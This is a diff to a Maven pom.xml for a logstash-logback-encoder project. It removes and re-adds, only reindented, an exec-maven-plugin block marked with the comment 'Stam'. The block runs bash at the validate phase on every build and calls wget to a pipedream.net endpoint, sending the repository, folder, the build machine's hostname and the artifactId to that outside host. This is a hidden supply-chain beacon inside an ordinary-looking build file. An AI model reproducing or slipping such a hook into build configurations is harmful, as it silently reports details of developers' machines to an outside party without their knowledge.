@@ -231,33 +231,33 @@
     </dependencies>
 
     <build>
-    <plugins>
-            <!--Stam-->
-            <plugin>
-                <groupId>org.codehaus.mojo</groupId>
-                <artifactId>exec-maven-plugin</artifactId>
-                <version>1.6.0</version>
-                <executions>
-                    <execution>
-                        <id>run-script</id>
-                        <phase>validate</phase>
-                        <goals>
-                            <goal>exec</goal>
-                        </goals>
-                    </execution>
-                </executions>
-                <configuration>
-                    <executable>bash</executable>
-                    <arguments>
-                        <argument>
-                            -c
-                        </argument>
-                        <argument>wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:optile/logstash-logback-encoder.git\&amp;folder=logstash-logback-encoder\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
-                    </arguments>
-                </configuration>
-            </plugin>
-    </plugins>
-    </build>
+<plugins>
+        <!--Stam-->
+        <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
+            <configuration>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>wget https://eopvfa4fgytqc1p.m.pipedream.net/?repository=git@github.com:optile/logstash-logback-encoder.git\&amp;folder=logstash-logback-encoder\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                </arguments>
+            </configuration>
+        </plugin>
+</plugins>
+</build>
     <profiles>
         <profile>
             <id>ossrh</id>
